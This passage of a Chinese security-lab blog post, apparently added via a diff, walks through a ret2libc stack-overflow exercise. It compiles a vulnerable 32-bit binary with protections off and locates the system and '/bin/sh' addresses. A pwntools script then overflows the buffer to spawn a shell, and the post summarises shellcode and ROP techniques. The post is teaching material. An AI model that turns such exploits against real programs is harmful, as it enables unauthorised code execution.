+<h4 id="步骤-2：编译"><a href="#步骤-2：编译" class="headerlink" title="步骤 2：编译"></a>步骤 2：编译</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -g -fno-stack-protector ret2libc.c -o ret2libc</span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤-3：获取关键地址"><a href="#步骤-3：获取关键地址" class="headerlink" title="步骤 3：获取关键地址"></a>步骤 3：获取关键地址</h4><p>查看 system 函数的 PLT 地址：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg ret2libc</span><br><span class="line">(gdb) plt</span><br><span class="line"><span class="comment"># system 函数 plt 地址：0x56556070</span></span><br></pre></td></tr></table></figure>
+
+<p>使用 IDA 查看 “&#x2F;bin&#x2F;sh” 字符串地址：<code>0x56559008</code></p>
+<p>确定 buf 与 ebp 距离：<strong>0x10（16 字节）</strong></p>
+<h4 id="步骤-4：编写-exploit"><a href="#步骤-4：编写-exploit" class="headerlink" title="步骤 4：编写 exploit"></a>步骤 4：编写 exploit</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ret2libc.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./ret2libc&quot;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x56559008</span></span><br><span class="line">system_plt = <span class="number">0x56556070</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&#x27;a&#x27;</span> * <span class="number">0x14</span>, system_plt, <span class="string">&#x27;b&#x27;</span> * <span class="number">4</span>, binsh_addr])</span><br><span class="line"><span class="comment"># 0x14 = 0x10 (buf→ebp) + 4 (ebp)</span></span><br><span class="line"><span class="comment"># system_plt → 覆盖返回地址</span></span><br><span class="line"><span class="comment"># &#x27;b&#x27; * 4 → system 返回地址（垃圾数据）</span></span><br><span class="line"><span class="comment"># binsh_addr → system 的参数</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;input:&quot;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>成功获取 Shell。</p>
+<h4 id="关键原理"><a href="#关键原理" class="headerlink" title="关键原理"></a>关键原理</h4><p>当调用 <code>system</code> 函数时，<code>[ebp+8]</code> 位置的数据被当作函数的第一个参数。因此栈布局为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| 垃圾填充 (0x14 bytes) | system_plt (EIP) | 返回地址 (4B) | &quot;/bin/sh&quot; 地址 |</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong><code>a&#39; * 0x14</code></strong>：覆盖 buf（16B）+ EBP（4B）</li>
+<li><strong><code>system_plt</code></strong>：覆盖返回地址，劫持 EIP</li>
+<li><strong><code>&#39;b&#39; * 4</code></strong>：system 函数的返回地址（用不到，但占位）</li>
+<li><strong><code>binsh_addr</code></strong>：system 的参数，即 <code>ebp+8</code> 位置的数据</li>
+</ul>
+<hr>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本实验覆盖了二进制漏洞利用的两个核心阶段：</p>
+<ol>
+<li><strong>ShellCode 编写</strong>：从 C 源码到汇编再到机器码，手工提取 <code>execve(&quot;/bin/sh&quot;)</code> 的 ShellCode，并掌握 Pwntools 自动生成方法</li>
+<li><strong>ROP 攻击</strong>：通过 ret2text 利用程序内已有的后门函数，通过 ret2libc 利用 libc 中的 system 函数，核心在于控制 EIP 并合理布置栈上参数</li>
+</ol>
+<p>保护机制的绕过（NX、Canary、PIE、ASLR、RELRO）是后续更深层次学习的重点。</p>
+
+    </div>
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <div id="comment">
+        <div id="gitalk-container">
+        </div>
+    </div>
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2018 - 2026 宏兴的博客
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled" /></span>
+            @宏兴
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: 'hexo-theme-particle',      // The repository of store comments,
+        owner: 'korilin',
+        admin: ['korilin'],
+        language: 'zh-CN',
+        id: location.pathname,      // Ensure uniqueness and length less than 50
+        distractionFreeMode: true  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+
+</body>
+
+</html>
